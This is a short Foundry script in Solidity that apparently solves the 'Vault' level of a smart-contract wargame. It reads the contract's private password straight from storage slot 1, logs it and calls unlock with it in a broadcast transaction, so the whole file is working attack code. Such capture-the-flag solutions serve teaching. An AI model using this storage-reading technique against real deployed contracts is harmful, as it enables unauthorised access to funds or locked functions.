// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/08_Vault.sol";

contract AttackerVaultScript is Script {
    function run() external {
        Vault vault = Vault(vm.envAddress("INSTANCE"));

        vm.startBroadcast();

        bytes32 pass = vm.load(address(vault), bytes32(uint256(1)));
        console.log("Vault pass :", uint256(pass));

        console.log("Vault status :", vault.locked());
        vault.unlock(pass);
        console.log("Vault status :", vault.locked());

        vm.stopBroadcast();
    }
}
